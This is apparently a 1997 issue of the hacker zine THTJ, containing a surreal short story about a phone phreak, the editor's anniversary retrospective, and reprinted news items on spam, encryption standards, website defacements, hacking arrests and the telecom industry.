"No! No more ringing!" Thoughts streamed through my brain again. I felt cold, 
and lonely. Cold like you do when the wind blows right through your sweater 
and makes your skin tingle. I was not lonely for lack of company; the 
loneliness was something more. I was lonely for a part of me. "Which part?" I 
asked myself. "Is there something missing?" Suddenly fear ran through me like 
a cold drop of water when it falls under your collar.

"Something *is* wrong! I can feel it..." quickly my fear turned to anger. 
"STOP RINGING! STOP THAT RINGING!" I couldn't take that ringing anymore. I 
tried to turn my head and open my eyes.

"Ugh!" I couldn't open my eyes, but I saw! What I saw was incredible. I was 
in space, in deep space. Huge galaxies in front and behind me, rotating 
slowly, spinning round in total silence. To my side, two galaxies inverted in 
each other, amazing. Total silence. My thoughts stopped. The galaxies spin 
silently in the depths of the universe. 

Colors streaked inside each galaxy in view, reds being left behind in the 
wake of stars, blue diamonds seemed to sparkle in the middle of each red. All 
the red began to slowly fade into an emerald purple with dark green spots 
every so often.

Every light I could see began to pulse. The pulsing, slow at first, a deep 
rhythmic pulsing, almost as if the universe itself was breathing. Quicker the 
pulsing became, now like a heart beat, now like the flashing lights on a 
police cruiser. Faster still the pulsing was. Like the frames of a movie. 
Like the propeller of a plane.

Darkness. Nothing. My mind sprang back to life yet again. "I'm dead. I am 
dead. This is what death is." But I was not sure of my thoughts, I had never 
been dead before you see. "Are my eyes closed?" I attempted to send the 
command from my brain, through my forehead, to my eyes. Open. Nothing. I 
couldn't be sure I even had eyes. Nothing had changed, nothing had moved. 
From somewhere deep back in my mind a ringing became clearer, more 
persistent. "Maybe this is hell. Perhaps this is what a bad fone phreak gets 
as punishment, eternal ringing." The ringing increased in volume somewhat. I 
tried to recall how I came to this. "Why am I here? What happened.. I know! I 
was holding those 3 lines when ringing current was applied to them. That's 
it. That's why I am hearing this horrible ringing now. It must have gotten 
stuck in me... Wait, what am I saying? What does that have to do with this 
ringing I'm hearing.." I was having trouble thinking clearly, and the ringing 
wasn't helping any.

I felt sick to my stomach, but seeing, apparently, that I didn't have a 
stomach, I wasn't sure what I was sick to. But I did feel sick, the kind of 
sick you get in the car when you're not watching the road. I couldn't move, 
couldn't see, couldn't feel a body, couldn't stand that eternal ringing!

Light! Cool air rushed over my body and through my hair as this light blinded 
me. Heaven? The car passed me quickly with the sound of its motor changing 
pitches as it receded into the distance taking the light with it. I could see 
again. I was on the side of a small two-lane road, in what appeared to be the 
middle of the desert. An open bridging box was next to me, its 2 record 
tables lying on the ground, half covered with dirt. A lineman's handset, laid 
in the dirt, both of its clips attached to binding posts in the box.

"The ringing, it's coming from the handset." And sure enough it was. The 
handset shook every time it rang. It did not strike me as odd; it was the way 
it should be.

I stared at the handset. It rang. And rang. 10, 20, 30 times it rang. I stood 
in the dark, the slight breeze sending a chill though me, watching the 
handset. Everything went black. The ringing continued. The handset was still 
there, its alligator clips floating in the black. Total silence pierced at 
intervals by the horrible ringing. The handset shook every time it rang. It 
did not strike me as odd, why should it? It was as it should be.

I reached out for the handset, not with my hand, not with my mind, I simply 
reached. The ringing stooped with the line going off hook.

I waited. I listened. Nobody spoke.

"Hello?" I asked.

No response. I questioned again into the handset.

"Hello? Who is there?"

A long pause, then, the most soft, and quiet, female voice I had ever heard 
came on the line.

"Mr. Quince? I have a collect call for u from a friend. Do you want to 
except?"

"Yes I will except." I replied without giving it a thought. It was getting 
hard to think again, and I didn't want to force myself to.

A few clicks on the line, a short pause, and then he spoke. He spoke softly, 
like the operator did, but with a tinge of slowness

"Hello Keith."

I paused before responding, thinking to myself. "Why can't I focus my 
thoughts? What is wrong?" I considered the darkness around me, the dead 
silence. I couldn't think. I began to not care.

"Who is this?" I asked with a bit of despair.

"This is your mind Keith."

My thoughts were so groggy; I could barely keep track of what was going on. 
The darkness seemed to grow more intense if that was possible. The handset 
started to loose its color and depth until it was nothing more then a black 
and white picture.

"What do you want?" I managed to get out. The darkness was consuming me. I 
couldn't tell where I ended and it began. My thoughts were soon to stop 
forever. Before that however, I heard the voice's sweet and gentle 
reply.

"I just called to tell you. To tell you that I am leaving. Forever." his 
voice echoed softly down to a mummer.

I became blackness, ceasing to exist. All that was left, All that 
remained, was the black and white picture of the handset.

[Looking Back] a year later....
        by Scud-O

        God, i can not believe that THTJ is 1 year old this month. Hell, I
can not believe how far the zine has come. On June 6th last year (1996), Our
first issue came out. It was an in print zine, and at the time, HAVOC Bell
Systems wasn't HAVOC Bell Systems, it was HAVOC. I Created HAVOC to be a
local group, my friends, etc. Well, my friends werent really hackers or
phreakers, they were just a buncha 'anarchists' interested in blowing stuff
up, and other such things. Needless to say, THTJ no longer prints anarchist
files, nor is it in print. About the same time as THTJ 1 came out, the web
site at our old geocities came online. Hell, at the time i knew next to
nothing on HTML, look at the site today, much better. I first made the site
to be just for the HAVOC group, on local stuff, but that changed. I realized
what a place the WWW was. It was a great distribution site for THTJ. Issues 2
and 3 came out during the summer, with mostly a buncha shit i wrote that i am
shocked i could have ever written. By October, i had come back to IRC and both
#phreak and #hacker, channels i had hung out in, and been mostly an idler. Id
talk, but not that much. Anyway, i met some very cool people like the MIA
|\|\cFill , and current member Keystroke. Afterward, i met REality, and got
him to sign up, then hell everyone was pouring into HBS. We released issues 4
and 5 which mostly had stuff by me, however 5 did include stuff by Key and
McFill. Issue 6 came out around the new year, and then well i released the
bomb. Issue 7 came out, and well, sucked. After 6-9 months of working on THTJ
i had released a bad issue, was well was worried about THTJ. I was determined
to make issue 8 the best yet. And well, i think i succeded. It was a smashing
release, and was well recieved. However during this time, i had let my grades
slip, and i had to let KungFuFox edit THTJ 9. I REALLY want to thank you for
editing THTJ 9 for me Kung, I owe you so much, with out you, hell THTJ would
still have a readership of like 100 instead of the thousands that are reading
it currently. Then, well issue 10 came out and was a huge success like issues
8 and 9 before it, and well here is issue 11, which probably is going to have
a big release like the issues before it. I want to thank you all for reading
this article of an insane editor, and to thank you for reading THTJ and
keeping it alive. And I hope THTJ is doing just as well one year from now as
it is currently doing.

 AOL Mail Chokes on Spam Antidote
 by Michael Stutz 

 12:02pm 13.May.97.PDT -- A rash of email delivery problems this past week at 
 America Online - including the clogging of several Internet mailing lists - 
 have been caused mainly by the company's spam-fighting efforts, officials at 
 the Dulles, Virginia-based company, claim. 

Last Friday, AOL chief Steve Case had affirmed a beefing up of the company's 
email capabilities in his latest "Community Update" column, saying that 
recent efforts to improve system quality included AOL's increased ability to 
handle email, and that the number of incoming messages the service could 
handle was up to almost 400 million per month. 

But while Case's words rang in the background, a portion of the email 
messages directed at AOLers from the rest of the Net took up to five days to 
arrive - or simply bounced back to the sender. 

Alex Phillips, an administrator at Rockingham Internet Community Access, said 
the problem caused his company to have almost 8,000 messages to AOL addresses 
pile up on his email server. 

"It seemed to be localized to select domains on the Net," he said. "Many 
messages from other ISPs in the country were flowing just fine. Our mail 
server is in Boise, Idaho, and trace routes to AOL's mail server were showing 
no response from their St. Louis hop for about a week." 

The problem was especially harsh on mailing lists, where copies of each post 
would get forwarded to each AOL subscriber on that list, and either bounce 
back to the moderator or pile up in the list's email queue. 

The Searoom-l, a list for the discussion of wooden sailing ships, was one of 
the many lists that felt the curse of AOL email last week. In a message 
posted to the list, list moderator John Berg had said, "AOL changed their 
software which rejects incoming messages. We can see Searoom-l subscribers' 
messages, but they can't see ours, because AOL's new software doesn't accept 
our messages." 

AOL spokeswoman Tricia Primrose said the problem was an internal gaffe, 
caused by an effort to stop spam by selectively blocking incoming email 
messages. "I talked to one of our operations guys and he verified that we did 
have a problem last week," she said. "We're aggressive in protecting our 
members from spam, and we put in a change last week to block it out - and it 
unintentionally blocked some incoming listserv mail as well." 

The default mail setting for AOLers is PreferredMail, which filters incoming 
email from a list of rogue domains and spammers. The list of sites is 
available to AOL members by an internal AOL document called "PreferredMail - 
The Guard Against Junk E-mail," Primrose said. 

A court order last year had limited the notorious spam factory Cyber 
Promotions to sending to AOL from only five domains, which AOL has put on its 
PreferredMail filter list. The list is updated when users forward copies of 
spam to the AOL screen name TOSSPAM. 

Primrose noted that the PreferredMail option could be disabled, should the 
user want to receive unsolicited commercial email, but that "the vast 
majority of our members don't like spam." 

Email delivery problems have plagued AOL for some time - a lag between the 
steady influx of AOL customers and the company's equipment upgrades have put 
a strain both on its system and the rest of the Net. One month ago, a huge 
backlog of AOL mail was returned to sender to the University of Madison's 
email server, causing it to crash. 

"We're constantly scaling our architecture to increase the demand," says 
Primrose, noting that internal mail down times do occur, usually lasting from 
15 minutes to 2 hours in length. She said AOL has seen email "increase 
dramatically in the last five months, coinciding with our switch to flat-rate 
pricing, and going from 5 million to 12 million messages a day."

 Pretty Good Politics
 by Simson Garfinkel 

 5:00am 7.May.97.PDT -- Phil Zimmermann is about to fight the biggest battle 
 of his career. But this time Zimmermann isn't fighting against the US 
 government; he's fighting against Microsoft and Netscape. 

Zimmermann is, of course, that mythic crypto rebel hero. Back in 1991, 
Zimmermann wrote an email encryption program called PGP (pretty good privacy) 
and gave it away. PGP was "encryption for the masses." That made the US 
government nervous. 

But PGP has had a big problem since its invention - the program was (and 
still is) extremely difficult to use. As a result, most people who have PGP 
rarely use it. Hell, I even wrote a book about how to use PGP, and I hate 
getting encrypted email; it's a pain. Still, the encryption program has been 
the de facto standard for six years. 

Zimmermann and his start-up, PGP Inc., are trying to develop an easier-to-use 
version of the program, and a plug-in for Netscape Navigator to make 
encryption transparent. Unfortunately, they may be blowing into the wind. 
That's because both Netscape Communicator, bundled with Navigator 4.0, and 
Microsoft Outlook Express, bundled with Explorer 4.0, come with built-in 
support for email encryption, and they don't use PGP. Instead, they use a 
different technology, called S/MIME. S/MIME is an encryption standard 
developed by RSA Data Security. 

What's developing here is one of those religious wars for which the computer 
industry is so well known. On one side, there is the alliance between 
Netscape, Microsoft, RSA Data Security, and much of the computer industry. 
They are pushing for S/MIME as a worldwide secure email standard. On the 
other side is PGP Inc., which says the S/MIME standard is fundamentally 
flawed because it requires support for 40-bit crypto, which is too weak to be 
of much utility, but exportable under federal law. 

Charles Breed, PGP's director of technical marketing, says S/MIME turns its 
back on the thousands of Internet users who use PGP. 

Netscape brushes off Breed's charges. "We don't want to get into religious 
wars on the mail standards," says Eric Greenberg, Netscape's security product 
manager. "There are a lot of PGP users out there, and we are pleased that PGP 
has offered a plug-in for our product." 

For S/MIME, the real problem doesn't seem to be PGP but the Internet 
Engineering Task Force. RSA has offered S/MIME to the IETF as a proposed 
standard for sending encrypted email. But at the last IETF meeting in 
Memphis, Tennessee, a number of objections were raised: 

1.S/MIME is a trademark of RSA Data Security. In order for it to be a 
standard, RSA would have to give up the trademark. 

2.The S/MIME standard currently requires that any implementation be able to 
encrypt and decrypt data using the RC2 data-encryption algorithm and the RSA 
public key algorithm. Although RC2 has been published on the Internet, the 
algorithm is still officially an RSA Data Security proprietary technology, 
and the company has threatened to take legal action against any firm that 
implements the algorithm without a license. As for the RSA algorithm, it's 
patent isn't up until the year 2000. 

3.Finally, S/MIME's requirement that any implementation be able to encrypt 
and decrypt messages with a 40-bit key doesn't sit well with IETF's technical 
gurus, who don't want to approve a standard that requires weak crypto just so 
US companies can sell their wares overseas. IETF's charter is to create the 
best standard possible, not to create a standard that is in the interests of 
US businesses. 

"S/MIME in its current incarnation cannot become an Internet standard," says 
Jeff Schiller, who heads the IETF's section on security. "So basically, one 
of three things has to happen. One is that the RSA people give the IETF 
people the appropriate rights to the trademark. Either they have to give up 
on RC2 and allow other public key algorithms - it should be possible to 
implement this Internet standard without having to buy technology from RSA. 
Or the IETF needs to develop something [for which] all the rights are 
available." 

RSA has until 1 July to make up its mind, Schiller says. 

The standard may already be moot. With Microsoft and Netscape poised to ship 
millions of programs that implement S/MIME, there certainly will be encrypted 
email for anybody who wants it. On the other hand, it would be nice if there 
were an international email encryption standard that wasn't hobbled by 40-bit 
restrictions. 

The real losers in all this are Phil Zimmermann and PGP Inc. That's because 
the same rules that prevent Netscape or Microsoft from selling strong crypto 
overseas also block PGP from doing the same. PGP's only market is the United 
States, and it is competing against Microsoft's free Outlook Express - which 
is a pretty darn good email program - and Netscape's Communicator, which does 
a much better job of integration than PGP can with its plug-in.

 Hong Kong Is Asia's Spam Epicenter 
 By Eric Lai, IT Daily.
 
 HONG KONG, 1997 MAY 14 (NB) -- The Spam capital of Asia? Without a doubt, 
 Hong Kong. Two big reasons: Hong Kong's pro-business culture and the 
 proliferation of ISPs. 

The Office of Telecommunications Authority says that under the existing 
licence for ISPs, the "transmission of unsolicited advertising information or 
unsolicited promotional information" is forbidden because it is a public 
nuisance. 

The problem is enforcement. OFTA says that regulating junk e-mail is up to 
individual service providers. Hong Kong ISPs informally agree to help each 
other find and terminate spammer accounts, according to Daniel Ng, president 
of the Hong Kong Internet Service Provider Association, a local trade group, 
and Hongkong Star Internet. 

But as evidenced by complaints from Internet users around the world, local 
ISPs have been a little lax in cracking down on spammers. Part of the problem 
is the sheer number of ISPs here. The territory has around 60 ISPs, serving, 
according to IDC, around 114,000 subscribers. The resulting heavy competition 
means that earnest spammers can cheaply and easily hold multiple accounts. 

Singapore, by contrast, has about the same number of Internet users, but due 
to an arduous licensing process, only three commercial service providers. 
Singapore regulations restrict access to political and sexual material on the 
Internet, but they don't ban junk e-mail. The Singapore Broadcast Authority 
and the Telecommunications Authority of Singapore don't regulate junk e-mail, 
or junk faxes, either. The SBA says they only deal with broadcasting and 
broadcasting material, while the TAS says it doesn't deal with content. 

In the absence of formal rules, Singaporean ISPs have decided to follow 
accepted netiquette and stop spam when they find it. "Basically spammers are 
a nuisance," says Maureen Tseng, communication manager for Pacific Internet. 
While bulk e-mailers have never inadvertently crashed Pacific Internet's mail 
servers, they have slowed down performance in "isolated instances." Tseng, as 
well as officials from CyberWay, another ISP, agreed that commercial spamming 
has not been a major problem. 

In the Philippines, there are also more than 60 service providers and no 
formal regulations against junk e-mail. But commercial junk E-mails are also 
relatively unknown, according to industry executives there. "We're just not 
that technologically advanced," quipped a manager at InfoCom, the 
Philippines' largest ISP. 

Could it be Hong Kong's fabled moneymaking culture which, at the very least, 
does not actively frown upon efforts to make a buck? Chapman Chow of Active 
Promotion thinks so. Out of more than 3,000 e-mails from Internet users 
requesting to be taken off Active Promotion's list, Chow claims he "didn't 
get any upset replies." This, he says, indicates that Hong Kong citizens are 
more accepting of junk e-mail. Alamo Music's Alleva says about 10 percent of 
the replies to his bulk e-mails, sent to Hong Kong and global Internet users, 
are negative. But Alleva's statistics aren't necessarily accurate because, 
for one thing, his software automatically "bounces back" any messages from 
irate users who use foul language. 

Creating commercial Web sites is cheap, but it's not an effective marketing 
tool unless you get visitors. Bulk e-mail is attractive because it can reach 
huge numbers at practically no cost. 

Spammers rave about how cheap it all is. But like selfish children, they 
conveniently ignore the hard fact that someone is picking up the bill for 
them. In most cases, it is the ISPs who have to purchase more computers to 
process the extra e-mail traffic. Netvigator, for instance, cited an 
overloaded and subsequently crashed e-mail computer to Alleva as its official 
reason for terminating his "ccr" account. More staff is also required to 
field complaints from subscribers and Internet users worldwide. 

Spam recipients aren't spared, as they must spend time downloading, reading 
and deleting unwanted e-mail, ask to be removed from junk e-mail lists, or 
implement filters to block out spam.

 Polish Govt Web Site Hacked - Police Investigate 
 By Sylvia Dennis
  
 WARSAW, POLAND, 1997 MAY 9 (NB) -- Polish government officials were outraged 
 this week when it was revealed that the Cabinet office's newly established 
 Web site had been altered by Polish hackers calling themselves Damage Inc. 

The Cabinet Web site has now been taken offline, but a copy of the altered 
Web site can be found at http:/www.software.com.pl/intdev /news/welcomep.html 
the site of the Net security Institute in Warsaw. 

The hackers altered much of the data on the site by uploading their own pages 
last weekend, with headers such as "Hackpolska Polska (Hackrepublic of 
Poland) and the "Centrum DizinInformacyjne Polska" (Polish Government 
Disinformation Center." 

Links from the Cabinet office site were rerouted to a number of sexually 
explicit sites. For example, the routes from the site to information about 
the Prime Minister route to http://www.playboy.com . 

Interestingly, many of the routes from the Web site appear to have been 
trashed, and supporting images on the Web site (GIFs) no longer load as 
requested. This suggests that the hackers used a "quick and dirty" method of 
trashing the site, rather than taking their time. 

Gazeta Wyborcza, the Polish daily newspaper, reports that the police, at the 
express request of the government, have set up a task force to track down the 
hackers, who are thought to reside in Poland. 

What the hackers may not be aware of, Newsbytes notes, is that Polska Telecom 
is still a state operation, and that listings of telephone accesses to the 
Internet are freely available to the Polish secret service. It seems logical 
to assume that the police are now hot on the trail of the hackers. 

At a press briefing in Warsaw to discuss the hack, the most serious in Polish 
history, government spokesperson Aleksandra Jakubowska said that the 
government Web server has been disconnected from the Internet until new 
security systems are installed. 

Considerable anti-hacking fury has been generated by the hack, and Newsbytes' 
sources suggest that this may be the catalyst for the Polish government to 
formulate its own computer misuse legislation. As Poland is now on the way to 
joining the European Community, this unexpected step, by "Damage Inc" could 
bring the creation of the legislation forward by several years.

 Gates Harasser Charged 
 (05/16/97; 11:00 a.m. EDT)
 By Christine Casatelli, TechWire

 SEATTLE -- A 21-year-old Illinois man was arrested after threatening to kill 
 Microsoft chairman Bill Gates and his wife unless they paid him $5 million, 
 according to an Associated Press report Thursday.

Adam Quinn Pletcher is charged with making the threats in four letters sent 
to Gates at Microsoft's Redmond, Wash., headquarters, the AP report said. A 
federal grand jury here indicted Pletcher on Wednesday.

"Obviously, we have taken this threat very seriously," said Mark Murray, a 
Microsoft spokesman. The matter was handled in a "rather routine matter" by 
Microsoft security, local police and the FBI, he said.

"Bill was never involved in any way in the investigation," said Murray, 
adding that he would not comment on whether Gates would be asked to testify.

The first letter, which was received March 14 and intercepted by Microsoft 
security, demanded that Gates post a personal ad on America Online to 
communicate with the writer.

The last letter, received April 17, told Gates he must put money in a foreign 
bank no later than April 26 ``to avoid dying, among other things,'' the AP 
report said. Also included in the letter was a computer disk to be used by 
Gates to communicate with the writer, who is said to live in Long Grove, Ill.

"The writer cautioned Gates not to notify law enforcement, and that if Gates 
did so, the writer could kill him with `one bullet from my rifle at a quarter 
of a mile away,'" the court documents said.

Pletcher also has been the target of a civil lawsuit filed by Illinois 
authorities charging that he operated a fraud scheme over the Internet, the 
AP report said.

Neither Gates nor his wife were harmed, and the $5 million demand was not 
paid, the AP report said.

Pletcher was released after posting $100,000 bail. If convicted of extortion, 
he faces a maximum punishment of 20 years in jail and a $250,000 fine.

The arraignment is scheduled for May 22.

 Java Bug Discovered 
 (05/18/97; 2:45 p.m. EDT)
 By Deborah Gage, Computer Reseller News

 JavaSoft has posted a statement on its web page acknowledging a Java 
 verifier bug found by researchers at the University of Washington.

A JavaSoft spokeswoman said the bug enables a class file to filter through 
the Java verifier and possibly crash the Java Virtual Machine. JavaSoft does 
not consider the bug a security bug because the University of Washington did 
not do a security, or so-called denial-of-service, attack.

JavaSoft will issue a patch for Java licensees this week and a fix will go 
out in version 1.1.2 of the Java Developers Kit, due within the next two 
weeks.

The University of Washington is also working with Microsoft on bugs found in 
the Internet Explorer browser, sources said. A Microsoft spokeswoman said, 
however, that no similar announcement was planned and that she was unaware of 
any bugs.

 Anti-Microsoft Sites Rampant On Web 
 (05/20/97; 9:00 a.m. EDT)
 By Malcolm Maclachlan , TechWire

 REDMOND, Wash. -- In the Internet Age, you know you're a VIP when someone 
 creates a Website just to make fun of you.

No one is more of a VIP than Microsoft chairman Bill Gates. However, the most 
mocked on the Internet seems to have taken the attitude that when you're the 
biggest, you can take the punches.

"There is so much humor and parody on the Internet," said Kurt Winkelman, 
cocreator of a spoof site known as Microcult. "Some of the bigger companies 
take it as a compliment."

Microcult compares the software giant to a cult along the lines of Heaven's 
Gate. It purports to offer products such as ActiveCult 97 and values 
employees willing "to kill themselves for the sake of technology."

The site is the work of Wilmington, Del.-based Museum Mercantile Ltd., a Web 
design and hosting firm run by Winkelman and two colleagues. However, far 
from being Microsoft haters, the company uses many of its products and has 
even done work for Microsoft.

The site just seemed like a fun thing to do, said Winkelman, adding that he 
was inspired by another site -- Microsnot -- which included a press release 
on Bill Gates buying England. Similarly, he said, some of the site's biggest 
fans are Microsoft employees.

There are spoof sites for other companies, too, Winkelman said, including 
Wired and CNet. No one, however, compares with Microsoft, he said. There is 
now a Website dedicated exclusively toward cataloging Microsoft spoof sites, 
called The MSBC Super List of Anti-Microsoft Websites, which contains more 
than 80 such links.

Common themes include comparing Gates to Satan or Bill Clinton. Other links 
include the  The Boycott Microsoft page and the subtly named Microsoft Sucks 
page. There is even The Bill Gates Personal Wealth Clock, which tries to keep 
up to date with Gates' immense personal fortune.

Despite all the venom, Microsoft does not seem particularly concerned, even 
with sites that copy its logos for hostile satire.

"Microsoft does not have any specific stance on spoof sites," a Microsoft 
spokesman said. The software giant has not taken action against the 
developers on any of the parody Websites, he said. "There are so many out 
there, we just let them be."

 World Wide Web to arrive on pay phones 
 May 20, 1997
 
 TORONTO (Reuter) -- The World Wide Web might be coming to a pay phone near 
 you, thanks to a small Canadian multimedia company that teamed up Tuesday 
 with a Hong Kong telecommunications concern.  

King Products Inc. said it received a $2.2 million order to supply multimedia 
and Internet-ready pay phones to INFA Telecom Asia Ltd. of Hong Kong.  

Called PowerPhones, the units will be installed in the Hong Kong Convention 
and Exhibition Center in time for the July 1 handover ceremony marking the 
transfer of the former British colony to China.  

PowerPhones will also be installed in railway stations and other tourist 
spots in Hong Kong and throughout China.  

"The PowerPhone is a major advance from the pay phones of the past that we 
have all become familiar with," King President Peter Richards said at a news 
conference.  

The wall-mounted unit is a combination pay phone and network computer that 
allows the display of advertising, telephone directories, hotel and 
restaurant reservations and other information.  

Company officials explained that the phone can be used to find a restaurant, 
make a reservation or call up a map for directions.  

The phones will also allow users to send and receive e-mail and surf the 
Internet, though these features will not be available immediately.  

The phone comes with a handset, a color touch screen and a slot for so-called 
smart cards and credit cards. It is powered by an Intel Corp. Pentium 
processor and uses various Internet protocols and accessories to run videos.  

"We expect to deploy the PowerPhone throughout Hong Kong and subsequently 
into China over the course of the year," INFA Telecom Chairman Peter Tsang 
said in a statement.  

King, best known for its line of electronic kiosks in malls and other public 
places, will make the units in Canada for INFA Telecom, which has operations 
in 70 Chinese cities. iMagic Infomedia Technology Ltd. of Hong Kong is 
providing software development for the product.  

King officials said the PowerPhone will be distributed in North America but 
could not give a date.

 Phone company says: Put your life on hold until we fix your line

 SILICON VALLEY DISPATCHES: MIKE CASSIDY 

 THIS TALK of high-speed communication, ISDN, T1, cellular, fax and the rest 
 makes Thomas Wyskida and Renata Kusiak laugh.

 They have to laugh; otherwise they'd kill somebody.

It's been three months since they moved from tiny Wappingers Falls, N.Y., to 
the self-proclaimed Heart of Silicon Valley, but the technology revolution 
has eluded them entirely.

"I can't even call up to order a pizza," Wyskida, 28, says.

It's the phone, or the lack of one. They are discovering what thousands in 
Silicon Valley know: Getting quick phone service around here is akin to 
hitting the lottery. With job growth and the Internet boom, Pacific Bell had 
a back-up of 2,000 service orders in its service area last week. People are 
considering bequeathing their place in line to their children or 
grandchildren.

Besides saying this will improve, the phone company says this is a good 
thing. It means their services are really popular. They had no idea so many 
would want so much -- second lines, high-speed computer connections -- so 
fast.

"I think that we're in a fairly unique position in this part of the country," 
says Ho Blair, media relations manager. "There is an increased awareness and 
sensitivity and state-of-the-art knowledge of telecommunications."

As one who manages media relations, Blair would rather you not call service 
delays a problem.

"It's not a problem," he says. "It's quite frankly a situation of heavy 
demand."

Which makes Wyskida laugh some more. The phone at the Sunnyvale home he 
shares with Kusiak, 31, went dead April 6. Workers fixed the corroded cables 
outside his house May 2. In between, he called Pac Bell every day asking for 
help.

"I probably talked to every one of their operators in 30 days," he says. "I'm 
probably on some kind of death list."

OK. It's not like his phone didn't work at all.

"At 3 o'clock in the morning, the phone would ring. You'd pick it up and 
you'd hear loud noises and static."

And it's not like Pac Bell was unsympathetic. One operator suggested he 
forward his calls to a neighbor. Wyskida was beginning to think California 
was a very different place.

"I figured, it's the same country. How much different can it be?"

But there he was, using a liquor store pay phone to work on his job search 
and call friends in New York. And, of course, to call Pac Bell, which did fix 
the problem. The phone company even called to check in.

"It was somebody from the billing department," Wyskida says. "They wanted to 
know if I received a bill yet."

 Japanese Police Nab Computer User On Hacking Charges 

 TOKYO, JAPAN, 1997 MAY 26 (NB) -- By Martyn Williams. Japanese police said 
 Friday, they had arrested a Saitama prefecture resident on charges covered 
 by a recent computer hacking law, the first such time the law has been used. 
 The man replaced weather images on the home page of TV-Asahi, a national TV 
 network, with pornographic images. 

Koichi Kuboshima, a 27-year old resident of Fujimi, Saitama Prefecture, just 
north of Tokyo, allegedly exploited a function on the Web page that allows 
users to upload weather information. 

Police tracked down Kuboshima by gaining access to the records of an Internet 
service provider that he reportedly used to carry out the hack. Local press 
reports said the account was opened with a false credit card number and name. 

Weather images were replaced with the images at 10am last Sunday morning and 
the Web site was taken down at 10:10am when other users notified TV-Asahi. 
The site was repaired and available again at 1pm. 

If convicted, Kuboshima faces a fine up to one million yen ($8,635) and up to 
five years behind bars.

 Opening Communication Between PCs and Phones
 by Chris Oakes 

 11:58am 29.May.97.PDT -- Despite the possible uses of linking caller-ID 
 information to software on the PC, the long-available enabling products 
 haven't become household - or even SOHO - names. So far, offerings 
 exploiting caller-ID intelligence have been aimed at larger, multi-line 
 businesses. 

Next month, one company hopes to make PC-based caller-ID technology more 
commonplace. To manage the caller-ID information of a single voice line, 
SOHOtools' Connect-ID, to be announced at the Atlanta Comdex show, will work 
in concert with database and contact-management software to let a PC react to 
incoming calls. 

The company says its retail price, US$60, introduces a new market to "voice 
communication management." 

"A number of people have goofed around with caller ID," says SOHOtools 
marketing director Don Wallis, "but it has never really been put into a 
retail scenario." 

The software-plus-hardware product touts call-tracking benefits via software 
designed to work in concert with Windows personal information managers such 
as Act and SideKick. 

As they become compatible with telephony APIs like Microsoft's TAPI, these 
and other applications can interact with telco-provided features like caller 
ID. Combined with inter-application standards like Windows' Dynamic Data 
Exchange, the potential actions initiated by a phone call multiply. 

The most obvious use of caller ID for the SOHO market is to leverage caller 
ID in a fashion similar to a big call center. When the call comes in, in 
addition to being logged and tracked by a database, a wealth of caller 
information is instantly accessed. SOHO users can be as responsive to 
customers' needs and interests as a large corporate call center. 

While increasingly sophisticated in email and fax communications, the PC has 
lagged in the management of the voice phone call. 

"The modem market had telephony all tied up," said Heather Poggimannis, VAR 
program manager for Rochelle Communications, which has been selling caller-ID 
PC products to businesses for several years. She says with the dominance of 
the modem between the PC and a phone line, it's been hard for the more truly 
telephony-oriented caller-ID device to make headway. 

Modem-makers like US Robotics are now making caller-ID functionality standard 
in their products, but without taking the technology beyond a software-based 
version of simple caller-ID devices. 

Nor does it often make sense to try to employ caller ID through a modem, she 
says, since that line is usually tied up with data duties. 

The combination technology also uniquely depends on the maneuvering of two 
industries - the telco and PC industries, neither intimately familiar with 
the other's market. 

Within the PC retail market, Poggimannis says caller-ID products suffer 
something of an identity crisis. Their vague "telephony" category - typically 
conjuring up modems and online communications - has made them difficult for 
stores to categorize and consumers to grasp. 

Complicating the issue is the fact that caller ID has only barely become 
available nationally, requiring the PC industry to wait while telcos iron out 
the technology and upgrade networks for universal deployment. 

"There's recently been a major push [for caller ID]," said Poggimannis, "but 
only from the telco side of the street." And their side doesn't work with PC 
applications in mind. "It's not their market." 

Wallis is undaunted. "Our game plan is to come from the bottom up," he said. 
If his company can satisfy people with four lines at a new price point of 
less than $400, he reasons, it can generate the business to establish a 
profitable retail market - ultimately creating a new category of "voice 
management" products. 

Meanwhile, for consumers, Jeff Johnson of Computer Professionals for Social 
Responsibility sees as much misery as benefit from the convergence of the PC 
with caller ID. 

"Before, the technology necessary to invade our privacy could only be 
afforded by large companies - the Fortune 500. Then the technology spread to 
the Fortune 5000, and now it's about to spread to the Fortune 500,000. Is 
that progress?"

 Phone giants talk of $50 billion deal    
 USA Today, May 28, 1997 

 AT&T and SBC Communications, the prior Southwestern Bell, are trying to come 
 up with a merger accord that would be worth $50 bil, the largest merger in 
 history. It would unite AT&T, which has a 52% market share in the US long 
 distance sector, and SBC which, since merging with Pacific Telesis, has a 
 25% market share in US local calling. Nevertheless, the merger would be 
 expected to face antitrust and regulatory hurdles. AT&T would become a 
 telecom giant with revenue of $80 bil/yr, which would be considerably larger 
 than the second largest phone firm, which is the merged Bell Atlantic-Nynex 
 with revenue in 1996 of $30 bil. Although AT&T does not have problems now, 
 problems can be expected in the future due to fierce competition from other 
 mergers. Detail is given to what the Justice Department's antitrust div can 
 be expected to examine in looking at the possible merger.
